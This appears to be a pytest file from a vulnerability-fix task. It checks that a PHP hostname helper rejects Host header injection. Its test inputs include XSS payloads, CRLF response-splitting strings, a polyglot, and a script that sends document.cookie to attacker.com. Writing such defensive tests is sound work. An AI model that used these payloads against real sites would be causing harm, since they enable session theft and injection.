#!/usr/bin/env python3
"""
Vulnerability tests for Host Header Injection in Hush_Util::hostname()

These tests verify that the vulnerability is blocked:
- FAIL in vulnerable state (injection succeeds)
- PASS in fixed state (injection is blocked/sanitized)
"""

import subprocess
import pytest


def run_php_code(code: str) -> tuple:
    """Execute PHP code and return stdout, stderr, returncode."""
    result = subprocess.run(
        ['php', '-r', code],
        capture_output=True,
        text=True,
        timeout=10
    )
    return result.stdout.strip(), result.stderr.strip(), result.returncode


class TestXSSInjectionBlocked:
    """Test that XSS payloads in Host header are sanitized or rejected."""

    def test_basic_script_tag_blocked(self):
        """Test that basic script tag injection is blocked."""
        code = r'''
        $_SERVER["HOST"] = "evil.com\"><script>alert(1)</script>";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        # After fix: should not contain raw script tags
        assert '<script>' not in stdout, "XSS payload was not sanitized - raw <script> tag present"
        assert '</script>' not in stdout, "XSS payload was not sanitized - raw </script> tag present"

    def test_script_with_src_blocked(self):
        """Test that script tag with src attribute is blocked."""
        code = r'''
        $_SERVER["HOST"] = "x\"><script src=http://evil.com/xss.js></script><div x=\"";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        assert '<script' not in stdout, "Script tag with src attribute was not blocked"

    def test_event_handler_xss_blocked(self):
        """Test that event handler XSS injection is blocked."""
        code = r'''
        $_SERVER["HOST"] = "test.com\" onmouseover=\"alert(1)\" x=\"";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        # Check that the injection is blocked - either sanitized or returns localhost
        has_raw_event_handler = 'onmouseover' in stdout and '"' in stdout
        is_safe = stdout == 'localhost' or '&quot;' in stdout or 'onmouseover' not in stdout
        assert is_safe, f"Event handler XSS payload not sanitized: {stdout}"

    def test_img_onerror_xss_blocked(self):
        """Test that img onerror XSS injection is blocked."""
        code = r'''
        $_SERVER["HOST"] = "x\"><img src=x onerror=alert(1)><div y=\"";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        assert '<img' not in stdout, "IMG tag XSS was not blocked"
        assert 'onerror' not in stdout or stdout == 'localhost', "Event handler injection not blocked"

    def test_svg_onload_xss_blocked(self):
        """Test that SVG onload XSS injection is blocked."""
        code = r'''
        $_SERVER["HOST"] = "x\"><svg onload=alert(1)>";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        assert '<svg' not in stdout, "SVG tag XSS was not blocked"

    def test_javascript_protocol_blocked(self):
        """Test that javascript: protocol injection is blocked."""
        code = r'''
        $_SERVER["HOST"] = "javascript:alert(1)//";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        # Should be sanitized to localhost due to invalid hostname chars
        assert stdout == 'localhost', f"Javascript protocol not blocked: {stdout}"


class TestHTMLAttributeInjectionBlocked:
    """Test that HTML attribute injection is blocked."""

    def test_double_quote_breakout(self):
        """Test that double quote breakout is blocked."""
        code = r'''
        $_SERVER["HOST"] = "test.com\" onclick=\"alert(1)";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        # Check injection is blocked
        is_safe = stdout == 'localhost' or '"' not in stdout or '&quot;' in stdout
        assert is_safe, f"Double quote breakout not blocked: {stdout}"

    def test_single_quote_breakout(self):
        """Test that single quote breakout is blocked."""
        code = r'''
        $_SERVER["HOST"] = "test.com' onclick='alert(1)";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        # Check injection is blocked
        is_safe = stdout == 'localhost' or "'" not in stdout or '&#039;' in stdout or '&apos;' in stdout
        assert is_safe, f"Single quote breakout not blocked: {stdout}"

    def test_angle_bracket_injection(self):
        """Test that angle brackets are blocked or encoded."""
        code = r'''
        $_SERVER["HOST"] = "test.com><malicious>";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        # Should be sanitized - either return localhost or encode the brackets
        has_raw_brackets = '<' in stdout and '>' in stdout and '&lt;' not in stdout
        assert not has_raw_brackets or stdout == 'localhost', f"Angle brackets not blocked: {stdout}"


class TestCRLFInjectionBlocked:
    """Test that CRLF injection (HTTP Response Splitting) is blocked."""

    def test_crlf_header_injection(self):
        """Test that CRLF injection in Host header is blocked."""
        code = r'''
        $_SERVER["HOST"] = "evil.com\r\nX-Injected: header";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        # After fix: should not contain the injected header
        assert 'X-Injected' not in stdout, "CRLF injection was not blocked"
        assert stdout == 'localhost', f"Invalid hostname with CRLF should return localhost, got: {stdout}"

    def test_lf_only_injection(self):
        """Test that LF-only injection is blocked."""
        code = r'''
        $_SERVER["HOST"] = "evil.com\nSet-Cookie: malicious=1";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        assert 'Set-Cookie' not in stdout, "LF injection was not blocked"

    def test_http_response_splitting(self):
        """Test that HTTP Response Splitting payload is blocked."""
        code = r'''
        $_SERVER["HOST"] = "x\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        assert 'HTTP/1.1' not in stdout, "HTTP Response Splitting not blocked"
        assert '<script>' not in stdout, "Response splitting payload executed"


class TestEncodedPayloadsBlocked:
    """Test that encoded/obfuscated payloads are blocked."""

    def test_html_encoded_payload(self):
        """Test that HTML-encoded looking payloads don't bypass validation."""
        code = r'''
        $_SERVER["HOST"] = "&lt;script&gt;alert(1)&lt;/script&gt;";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        # The ampersand & should trigger localhost return
        assert stdout == 'localhost', f"HTML-encoded payload not rejected: {stdout}"

    def test_unicode_encoded_payload(self):
        """Test that unicode-encoded payloads are handled."""
        code = r'''
        $_SERVER["HOST"] = "test.com%00<script>alert(1)</script>";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        # Should return localhost due to % character
        is_safe = stdout == 'localhost' or '<script>' not in stdout
        assert is_safe, f"Encoded payload not blocked: {stdout}"

    def test_null_byte_injection(self):
        """Test that null byte injection is blocked."""
        code = r'''
        $_SERVER["HOST"] = "legit.com\x00<script>alert(1)</script>";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        is_safe = stdout == 'localhost' or '<script>' not in stdout
        assert is_safe, f"Null byte injection not blocked: {stdout}"


class TestCachePoisoningBlocked:
    """Test that cache poisoning attacks are mitigated."""

    def test_arbitrary_host_rejected(self):
        """Test that obviously malicious hosts are rejected."""
        code = r'''
        $_SERVER["HOST"] = "attacker-controlled.evil.com/cache-poison";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        # The / character makes this invalid
        assert stdout == 'localhost', f"Hostname with path component not rejected: {stdout}"

    def test_host_with_query_string_rejected(self):
        """Test that host with query string is rejected."""
        code = r'''
        $_SERVER["HOST"] = "evil.com?redirect=malicious";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        assert stdout == 'localhost', f"Hostname with query string not rejected: {stdout}"


class TestComplexPayloads:
    """Test complex real-world attack payloads."""

    def test_polyglot_xss_payload(self):
        """Test polyglot XSS payload is blocked."""
        code = r'''
        $_SERVER["HOST"] = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        assert stdout == 'localhost', f"Polyglot payload not blocked: {stdout}"

    def test_nested_encoding_payload(self):
        """Test nested encoding attack is blocked."""
        code = r'''
        $_SERVER["HOST"] = "test%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E.com";
        require_once "/app/hush-lib/Hush/Util.php";
        echo Hush_Util::hostname();
        '''
        stdout, stderr, rc = run_php_code(code)
        # % character makes this invalid
        assert stdout == 'localhost', f"Nested encoding payload not blocked: {stdout}"

    def test_html_context_xss(self):
        """Test XSS in HTML context simulation."""
        code = r'''
        $_SERVER["HOST"] = "evil.com\"><script>document.location='http://attacker.com/steal?c='+document.cookie</script><div class=\"";
        require_once "/app/hush-lib/Hush/Util.php";
        $host = Hush_Util::hostname();
        // Simulate using hostname in HTML
        $html = "<a href=\"http://{$host}/\">Link</a>";
        // Check if script tag can execute
        if (strpos($html, '<script>') !== false) {
            echo "VULNERABLE";
        } else {
            echo "SAFE";
        }
        '''
        stdout, stderr, rc = run_php_code(code)
        assert stdout == 'SAFE', "XSS in HTML context not blocked"
